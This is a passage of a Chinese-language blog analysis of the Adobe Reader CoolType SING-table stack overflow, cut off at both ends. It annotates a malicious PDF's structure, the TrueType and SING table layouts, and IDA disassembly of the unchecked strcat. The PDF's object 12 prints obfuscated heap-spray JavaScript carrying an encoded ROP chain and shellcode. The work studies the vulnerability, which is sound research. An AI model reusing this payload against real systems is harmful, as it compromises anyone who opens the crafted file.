._.c...p...VPCLT   |</span><br><span class="line">    00000020: D1 8A 5E 97 00 00 EB C8 00 00 00 36 63 6D 61 70  ..^........6cmap   |</span><br><span class="line">    00000030: A4 C3 E8 A0 00 00 B1 6C 00 00 03 58 63 76 74 20  .......l...Xcvt    |</span><br><span class="line">    00000040: FF D3 1D 39 00 00 1E FC 00 00 01 FC 66 70 67 6D  ...9........fpgm   |</span><br><span class="line">    00000050: E7 B4 F1 C4 00 00 26 60 00 00 00 8B 67 61 73 70  ......&amp;`....gasp   |</span><br><span class="line">    00000060: 00 07 00 07 00 01 01 48 00 00 00 0C 67 6C 79 66  .......H....glyf   |</span><br><span class="line">    00000070: 0C 74 41 CF 00 00 26 EC 00 00 8A 7E 68 64 6D 78  .tA...&amp;....~hdmx   |</span><br><span class="line">    00000080: 34 F0 21 0E 00 00 EC 00 00 00 15 48 68 65 61 64  4.!........Hhead   |TTF字体表目录项</span><br><span class="line">    00000090: DD 84 A2 D0 00 01 01 54 00 00 00 36 68 68 65 61  .......T...6hhea   |</span><br><span class="line">    000000a0: 10 45 08 6F 00 00 EB 4C 00 00 00 24 68 6D 74 78  .E.o...L...$hmtx   |</span><br><span class="line">    000000b0: 09 C6 8E B2 00 00 B4 C4 00 00 04 30 6B 65 72 6E  ...........0kern   |</span><br><span class="line">    000000c0: DC 52 D5 99 00 00 BD A0 00 00 2D 8A 6C 6F 63 61  .R........-.loca   |</span><br><span class="line">    000000d0: F3 CB D2 3D 00 00 BB 84 00 00 02 1A 6D 61 78 70  ...=........maxp   |</span><br><span class="line">    000000e0: 05 47 06 3A 00 00 EB 2C 00 00 00 20 53 49 4E 47  .G.:...,... SING   |&lt;-SING表，此漏洞相关的表</span><br><span class="line">    000000f0: D9 BC C8 B5 00 00 01 1C 00 00 1D DF 70 6F 73 74  ............post   |</span><br><span class="line">    00000100: B4 5A 2F BB 00 00 B8 F4 00 00 02 8E 70 72 65 70  .Z/.........prep --+</span><br><span class="line">    00000110: 3B 07 F1 00 00 00 20 F8 00 00 05 68 00 00 01 00  ;..... ....h.... --+</span><br><span class="line">    00000120: 01 0E 00 01 00 00 00 00 00 00 00 3A F1 B9 F1 F4  ...........:....   |</span><br><span class="line">    00000130: 75 62 82 1D 14 A7 82 4A 0C 0C 0C 0C AC 86 F7 B5  ub.....J........   |</span><br><span class="line">    00000140: ED 50 17 29 5C 12 8D 01 4E 51 05 0E E7 CC BC CA  .P.)\...NQ......   |</span><br><span class="line">    00000150: 6B 02 ED 81 13 36 AD 5E 45 85 DC 7D DB C2 4B 84  k....6.^E..&#125;..K.   |各个表内容</span><br><span class="line">    00000160: E8 67 8A 92 74 90 C8 3D 03 65 FE 80 4E E7 C7 42  .g..t..=.e..N..B   |</span><br><span class="line">    00000170: 89 8B DA 08 91 71 7A 3D 83 8E BD 60 AB 8F FA 53  .....qz=...`...S   |</span><br><span class="line">    ...........                                                                   |</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">11 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Action</span><br><span class="line">    /S /JavaScript</span><br><span class="line">    /JS 12 0 R     //对象12为包含javascript脚本的对象</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">12 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length 4245</span><br><span class="line">    /Filter [/FlateDecode /ASCIIHexDecode]</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">    var TwfyIgWVELWlTuFfZHxdRwABbEcFoBorpIEvEZgQvCEtkxULaIeYgnbjGLZ = unescape;</span><br><span class="line">    var NJOkySifYFYiNbSJhpbeOAhYFHGSUtytCzWyyxXppauWTHErAKprE = TwfyIgWVELWlTuFfZHxdRwABbEcFoBorpIEvEZgQvCEtkxULaIeYgnbjGLZ( &apos;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u6dba%u42a5%udd5e%ud9c4%u2474%u5df4%uc931%u31b1%uc583%u3104%u0f55%u5503%u4762%ua2b7%u0594%u5b38%u6a64%ubeb0%uaa55%ucba6%u1ac5%u9eac%ud1e9%u0ae0%u977a%u3c2c%u12cb%u730b%u0fcc%u126f%u524e%uf4bc%u9d6f%uf5b1%uc0a8%ua738%u8e61%u58ef%uda06%ud233%uca54%u0733%ued2c%u9612%ub427%u18b4%ucce4%u02fc%ue9e9%ub9b7%u86d9%u6849%u6610%u55e5%u959d%u92f7%u4619%uea82%ufb5a%u2895%u2721%uab13%uac81%u1783%u6030%ud355%ucd3e%ubb11%ud022%ub7f6%u595e%u17f9%u19d7%ub3de%ufabc%ue57f%uac18%uf580%u11c3%u7d25%u46e9%udc54%u9867%u5aea%u9ac5%u64f4%uf379%uefc5%u8416%u25d9%u7a53%u6490%u13f5%ufd7d%u7e44%u2b7e%u878a%udefd%u7c72%uab1d%u3877%u4799%u5105%u684c%u52ba%u0b45%uc15d%ue205%u61f8%ufaaf&apos; );</span><br><span class="line">    var cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu = TwfyIgWVELWlTuFfZHxdRwABbEcFoBorpIEvEZgQvCEtkxULaIeYgnbjGLZ( &quot;%&quot; + &quot;u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; + &quot;%u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; );</span><br><span class="line">    while (cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu.length + 20 + 8 &lt; 65536) cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu+=cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu;</span><br><span class="line">    KrNXjctxftIMNXOAmLBVtncBhahStOdstYlNAoHKZNJUMqRFirPqOGIYcUpmgRqqDAhsswI = cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu.substring(0, (0x0c0c-0x24)/2);</span><br><span class="line">    KrNXjctxftIMNXOAmLBVtncBhahStOdstYlNAoHKZNJUMqRFirPqOGIYcUpmgRqqDAhsswI += NJOkySifYFYiNbSJhpbeOAhYFHGSUtytCzWyyxXppauWTHErAKprE;</span><br><span class="line">    KrNXjctxftIMNXOAmLBVtncBhahStOdstYlNAoHKZNJUMqRFirPqOGIYcUpmgRqqDAhsswI += cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu;</span><br><span class="line">    LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ = KrNXjctxftIMNXOAmLBVtncBhahStOdstYlNAoHKZNJUMqRFirPqOGIYcUpmgRqqDAhsswI.substring(0, 65536/2);</span><br><span class="line">    while(LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ.length &lt; 0x80000) LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ += LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ;</span><br><span class="line">    uwZycdevcUFGuewXrcVZdhwBvRytYBJbBJSpNyatsyiSCIvl = LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ.substring(0, 0x80000 - (0x1020-0x08) / 2);</span><br><span class="line">    var vOcAiZpBTekCUWuanxyjOsbZlqYVtRifJW = new Array();</span><br><span class="line">    for (BTqeWArJfacedmpaCNHYBpyzdROKuyNcvxBgIycbHdFSrzOZogvhokYUHsHAlmOTFHepivwTqE=0;BTqeWArJfacedmpaCNHYBpyzdROKuyNcvxBgIycbHdFSrzOZogvhokYUHsHAlmOTFHepivwTqE&lt;0x1f0;BTqeWArJfacedmpaCNHYBpyzdROKuyNcvxBgIycbHdFSrzOZogvhokYUHsHAlmOTFHepivwTqE++) vOcAiZpBTekCUWuanxyjOsbZlqYVtRifJW[BTqeWArJfacedmpaCNHYBpyzdROKuyNcvxBgIycbHdFSrzOZogvhokYUHsHAlmOTFHepivwTqE]=uwZycdevcUFGuewXrcVZdhwBvRytYBJbBJSpNyatsyiSCIvl+&quot;s&quot;;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">13 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /XFA 14 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">14 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length 372</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">    &lt;xdp:xdp xmlns:xdp=&quot;http://ns.adobe.com/xdp/&quot;&gt;</span><br><span class="line">    &lt;config xmlns=&quot;http://www.xfa.org/schema/xci/2.6/&quot;&gt;</span><br><span class="line">    &lt;present&gt;&lt;pdf&gt;&lt;interactive&gt;1&lt;/interactive&gt;&lt;/pdf&gt;&lt;/present&gt;</span><br><span class="line">    &lt;/config&gt;</span><br><span class="line">    &lt;template xmlns=&quot;http://www.xfa.org/schema/xfa-template/2.6/&quot;&gt;</span><br><span class="line">    &lt;subform name=&quot;form1&quot; layout=&quot;tb&quot; locale=&quot;en_US&quot;&gt;</span><br><span class="line">    &lt;pageSet&gt;&lt;/pageSet&gt;</span><br><span class="line">    &lt;/subform&gt;&lt;/template&gt;&lt;/xdp:xdp&gt;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">xref    //交叉引用表</span><br><span class="line">0 15    //说明下面的描述是从0号对象开始，数量为15</span><br><span class="line">0000000000 65535 f  //对象0的起始地址为00000000，产生号为65535，也是最大产生号，不可以再进行更改，f表示该对象状态为free</span><br><span class="line">0000000015 00000 n  //对象1的起始地址为00000015，产生号为00000，全零表明该对象未被修改过，n表示该对象在使用中</span><br><span class="line">0000000139 00000 n</span><br><span class="line">0000000264 00000 n</span><br><span class="line">0000000294 00000 n</span><br><span class="line">0000000332 00000 n</span><br><span class="line">0000000469 00000 n</span><br><span class="line">0000000503 00000 n</span><br><span class="line">0000000727 00000 n</span><br><span class="line">0000000853 00000 n</span><br><span class="line">0000001016 00000 n</span><br><span class="line">0000041370 00000 n</span><br><span class="line">0000041443 00000 n</span><br><span class="line">0000045816 00000 n</span><br><span class="line">0000045853 00000 n</span><br><span class="line"></span><br><span class="line">trailer     //尾部</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Size 15        //该PDF的对象数</span><br><span class="line">    /Root 1 0 R     //根对象的对象号为1</span><br><span class="line">&gt;&gt;</span><br><span class="line"></span><br><span class="line">startxref</span><br><span class="line">46280       //交叉引用表的偏移</span><br><span class="line">%%EOF       //文件结束标志</span><br></pre></td></tr></table></figure><p><code>TTF表目录头</code>结构如下：<br><img src="/resources/2018/2018-06-01-00.jpg" alt="TTF表目录头结构"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">                        表目录头</span><br><span class="line">          |￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣|</span><br><span class="line">00000000: 00 01 00 00 00 11 01 00 00 04 00 10 4F 53 2F 32  ............OS/2</span><br><span class="line"></span><br><span class="line">TrueType字体用machintosh的轮廓字体资源的格式编码，有一个唯一的标记名&quot;sfnt&quot;。</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong><code>sfnt version</code></strong>：0x00010000(sfnt-1.0)</li><li><strong><code>numTables</code></strong>：0x0011(Dec:17) 有17个表</li><li><strong><code>searchRange</code></strong>：0x0100</li><li><strong><code>entrySelector</code></strong>：0x0004</li><li><strong><code>rangeShift</code></strong>：0x0010</li></ul></blockquote><p><code>TTF表目录项</code>结构如下：<br><img src="/resources/2018/2018-06-01-01.jpg" alt="TTF表目录项结构"></p><h3 id="0x32-SING表结构"><a href="#0x32-SING表结构" class="headerlink" title="0x32 SING表结构"></a>0x32 SING表结构</h3><p>&emsp;&emsp;<code>SING技术</code>是Adobe公司推出的针对<code>“外字”（Gaiji）</code>的解决方案，<code>外字</code>是<code>日语</code>中的意思，<code>中文</code>中就是<code>生僻字</code>的意思。SING允许用户创建新字形，每个新字形作为一个独立的字体打包。这样打包出来的字形称为字形包（<code>glyphlet</code>）。这种格式通过Adobe公开的，且<code>基于OpenType</code>。SING（Smart INdependent Glyphlets，智能独立字形包）的规范允许字形包随同文件一起传送，这样包含SING字符的文件也是可携带的，而又不会字符乱码、异常显示。SING表结构文档真的不好找，一篇博客中说可以在这里<a href="https://www.adobe.com/devnet/opentype/gdk/topic.html" target="_blank" rel="noopener">Adobe Glyphlet Development Kit (GDK) for SING Gaiji Architecture</a>下载到一个名叫<code>GlyDevKit.zip</code>的压缩包，压缩包中的Gaiji SING Glyphlet spec.pdf文档中记录了有关SING表的一些规范，但是，可能由于时间问题，Adobe官网已经下载不到这个压缩包了，还好有关漏洞部分的内容，他的博客中已经提到。还可以在这里找到,<a href="https://github.com/adobe-type-tools/afdko/blob/develop/c/spot/sfnt_includes/sfnt_SING.h" target="_blank" rel="noopener">Adobe Font Development Kit for OpenType</a>。</p><p><code>SING表目录项</code>的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> struct_SING</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> tag[<span class="number">4</span>];        <span class="comment">//标记："SING"</span></span><br><span class="line">    ULONG checkSum;     <span class="comment">//校验和："0xD9BCC8B5"</span></span><br><span class="line">    ULONG offset;       <span class="comment">//表偏移："0x0000011c"</span></span><br><span class="line">    ULONG length;       <span class="comment">//数据长度："0x00001DDF"</span></span><br><span class="line">&#125;TableEntry;</span><br><span class="line"><span class="comment">//TrueType字体中的所有数据都使用big-endian编码，最高位字节在最前面（因为TrueType字体最初是由apple公司定义的，而apple公司的os运行在motorola的cpu上）。</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">000000e0: 05 47 06 3A 00 00 EB 2C 00 00 00 20 53 49 4E 47  .G.:...,... SING</span><br><span class="line">000000f0: D9 BC C8 B5 00 00 01 1C 00 00 1D DF 70 6F 73 74  ............post</span><br><span class="line"></span><br><span class="line">53 49 4E 47   D9 BC C8 B5   00 00 01 1C   00 00 1D DF</span><br></pre></td></tr></table></figure><p>下表列出了TrueType字体中常见的表:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">head           字体头                            字体的全局信息</span><br><span class="line">cmap           字符代码到图元的映射               把字符代码映射为图元索引</span><br><span class="line">glyf           图元数据                          图元轮廓定义以及网格调整指令</span><br><span class="line">maxp           最大需求表                        字体中所需内存分配情况的汇总数据</span><br><span class="line">mmtx           水平规格                          图元水平规格</span><br><span class="line">loca           位置表索引                        把元索引转换为图元的位置</span><br><span class="line">name           命名表                            版权说明、字体名、字体族名、风格名等等</span><br><span class="line">hmtx           水平布局                          字体水平布局星系：上高、下高、行间距、最大前进宽度、最小左支撑、最小右支撑</span><br><span class="line">kerm           字距调整表                        字距调整对的数组</span><br><span class="line">post           PostScript信息                    所有图元的PostScript   FontInfo目录项和PostScript名</span><br><span class="line">PCLT           PCL5数据                          HP PCL 5Printer Language的字体信息：字体数、宽度、x高度、风格、记号集等等</span><br><span class="line">OS/2           OS/2和Windows特有的规格           TrueType字体所需的规格集</span><br></pre></td></tr></table></figure><p>SING表内容的数据结构如下图所示：</p><div align="left"><img src="/resources/2018/2018-06-01-02.jpg" width="70%" height="50%" alt="SING表结构"></div><p>上面在分析PDF内容的时候已经将<code>SING表</code>和<code>SING表目录项</code>标出来了。</p><h3 id="0x33-漏洞触发"><a href="#0x33-漏洞触发" class="headerlink" title="0x33 漏洞触发"></a>0x33 漏洞触发</h3><h4 id="1、静态分析"><a href="#1、静态分析" class="headerlink" title="1、静态分析"></a>1、静态分析</h4><p>用IDA打开<code>CoolType.dll</code>库，Shift+F12打开<code>String窗口</code>，搜索<code>&quot;SING&quot;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0819CE34 0000000C C quotesingle                               </span><br><span class="line">.rdata:0819DA2C 0000000D C missing maxp                              </span><br><span class="line">.rdata:0819DB4C 00000005 C SING                                      </span><br><span class="line">.rdata:081A6F38 00000013 C Error parsing CMap                        </span><br><span class="line">.rdata:081A6F4C 00000016 C missing codespace map</span><br></pre></td></tr></table></figure><p>双击上面的<code>第三个条目</code>，跳转到下面所示位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0819DB4C ; char aSing[]</span><br><span class="line">.rdata:0819DB4C aSing           db &apos;SING&apos;,0             ; DATA XREF: sub_8015AD9+D2o</span><br><span class="line">.rdata:0819DB4C                                         ; sub_803DCF9+7Bo ...</span><br></pre></td></tr></table></figure><p>用鼠标点击aString[],Ctrl+x查看<code>交叉引用</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Direction  Type  Address          Text  </span><br><span class="line">Up         o     sub_803DCF9+7B   push    offset aSing    ; &quot;SING&quot;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;双击这条就可以定位到解析存在漏洞的地方。下面就是<code>CoolType</code>库对<code>SING表</code>的解析代码，当<code>uniqueName</code>字段为超长字符串时，执行<code>strcat()</code>前未对其长度进行检测，执行<code>strcat()</code>后，会将该字段复制到固定大小的栈空间，最终<code>导致栈溢出</code>。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0803DCF9     <span class="keyword">push</span>    <span class="built_in">ebp</span>                            <span class="comment">; 父函数ebp</span></span><br><span class="line"><span class="symbol">.text:</span>0803DCFA     <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">104h</span>                      <span class="comment">; 分配栈空间0x104</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD00     <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>+<span class="number">104h</span>+uniqueName_buf] <span class="comment">; esp-4赋给ebp,而不是esp-4处的值赋给ebp,后面strcat会把执行结果保存在以ebp为起始地址的栈空间中</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD04     <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie <span class="comment">; security_cookie-&gt;eax</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD09     <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                <span class="comment">; security_cookie^ebp-&gt;eax</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD0B     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_4], <span class="built_in">eax</span>   <span class="comment">; 将和ebp异或完的security_cookie存到栈上父函数ebp之前的4字节中</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD11     <span class="keyword">push</span>    <span class="number">4Ch</span>                     <span class="comment">; __EH_prolog3_catch函数中分配栈空间的大小</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD13     <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8184A54 <span class="comment">; 调用__security_check_cookie函数的代码段起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD18     <span class="keyword">call</span>    __EH_prolog3_catch      <span class="comment">; 向栈上写入SEH结构</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD1D     <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_C]</span><br><span class="line"><span class="symbol">.text:</span>0803DD23     <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_0]</span><br><span class="line"><span class="symbol">.text:</span>0803DD29     <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_4]</span><br><span class="line"><span class="symbol">.text:</span>0803DD2F     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_130], <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD32     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_138], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD35     <span class="keyword">call</span>    sub_804172C</span><br><span class="line"><span class="symbol">.text:</span>0803DD3A     <span class="keyword">xor</span>     <span class="built_in">esi</span>, <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD3C     <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>+<span class="number">8</span>], <span class="number">3</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD40 <span class="comment">;try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD40     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD43     <span class="keyword">jz</span>      loc_803DF00</span><br><span class="line"><span class="symbol">.text:</span>0803DD49     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD4C     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_120], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD4F     <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>+<span class="number">0Ch</span>], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD4F <span class="comment">;&#125; // starts at 803DD40</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD53 <span class="comment">;try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD53     <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD57     <span class="keyword">jnz</span>     loc_803DEA9</span><br><span class="line"><span class="symbol">.text:</span>0803DD5D     <span class="keyword">push</span>    offset aName    <span class="comment">; "name"</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD62     <span class="keyword">push</span>    <span class="built_in">edi</span>             <span class="comment">; int</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD63     <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124]</span><br><span class="line"><span class="symbol">.text:</span>0803DD66     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_119], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD6A     <span class="keyword">call</span>    sub_80217D7</span><br><span class="line"><span class="symbol">.text:</span>0803DD6F     <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD72     <span class="keyword">jnz</span>     short loc_803DDDD</span><br><span class="line"><span class="symbol">.text:</span>0803DD74     <span class="keyword">push</span>    offset aSing            <span class="comment">; "SING"</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD79     <span class="keyword">push</span>    <span class="built_in">edi</span>                     <span class="comment">; 类对象指针(0x0012E718),第一个变量为dword_823A850加1之前的值。</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD7A     <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C] <span class="comment">; ecx为字体对象,thiscall,ecx传参</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD7D     <span class="keyword">call</span>    sub_8021B06             <span class="comment">; 解析字体对象,处理SING表</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD82     <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C] <span class="comment">; eax指向SING表数据</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85     <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                <span class="comment">; 判断是否为空</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85 <span class="comment">;&#125; // starts at 803DD53</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD87 <span class="comment">;try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD87     <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8B     <span class="keyword">jz</span>      short loc_803DDC4       <span class="comment">; 这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8D     <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>]              <span class="comment">; 